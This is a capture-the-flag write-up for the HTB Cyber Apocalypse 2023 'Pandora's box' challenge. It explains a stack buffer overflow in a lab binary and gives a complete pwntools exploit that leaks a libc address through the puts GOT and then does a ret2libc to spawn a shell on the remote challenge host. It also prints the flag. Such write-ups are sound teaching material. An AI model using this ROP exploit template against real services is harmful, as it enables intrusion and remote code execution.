# Pandora's box - HTB Cyber Apocalypse 2023

## Description
You stumbled upon one of Pandora's mythical boxes. Would you be curious enough to open it and see what's inside, or would you opt to give it to your team for analysis?

## Solution
There's a buffer overflow inside the `Insert location of the library:` prompt, which allows us to perform ROP.

Checksec:
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
RUNPATH:  b'./glibc/'
```

file:
```
./pb: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=d0165634ba8886a0cdf61584d8c941d30ff3820e, for GNU/Linux 3.2.0, not stripped
```

There is no PIE or canary on the binary, so we just have straight up ROP.

Since there is no win function in this binary, we will have to leak libc.

This can be done by using puts to leak an address in the Global Offset Table, then returning to main.

Any address in the GOT can be used. But in this case I opted to use the puts GOT also.

```
I use the puts to the leak the puts :)
```

The exploitation will be divided into two stages.

1. Leak the puts GOT
2. Overflow and ret2libc

To leak the puts got, we first pop the address of the puts GOT into rdi. Then jump to puts's plt to call puts. Puts will then dereference our address and print the contents. We can then return to box() afterwards.

After we have leaked libc, we have all the options in the world. So spawning a shell with system seem like a good candidate.

Exploit:
```py
from pwn import *

io = remote("165.232.108.236",30641)

#Function to get to the overflow
def get_to_overflow():
    io.recvuntil(b'>>')

    io.sendline(b'2')

    io.recvuntil(b'Insert location of the library:')


get_to_overflow()

padding = b'A'*cyclic_find(b'oaaa')

#Gadgets needed for leaking the puts GOT
poprdi = p64(0x000000000040142b)
putsgot = p64(0x403fa0)
putsplt = p64(0x00401030)
box = p64(0x004012c2)

#Leak puts GOT
payload = [
    padding,
    poprdi,
    putsgot,
    putsplt,
    box
]
payload = b''.join(payload)
io.sendline(payload)

#Receive puts leak
io.recvuntil(b'We will deliver the mythical box to the Library for analysis, thank you!\n\n')
puts_leak = u64(io.recvline()[:-1].ljust(8,b'\x00'))

#Calculate base of LIBC
libc_base = puts_leak - 0x80ed0
log.info(f"LIBC BASE: {libc_base:#x}")

#Calculate pointers we need
system = p64(0x50d60 + libc_base)
binsh = p64(0x001d8698 + libc_base)
ret = p64(0x0000000000401016)

get_to_overflow()

#Spawn shell payload
payload = [
    padding,
    ret, #For alignment
    poprdi,
    binsh,
    system
]
payload = b''.join(payload)
io.sendline(payload)


io.interactive()
```

## Flag
`HTB{r3turn_2_P4nd0r4?!}`
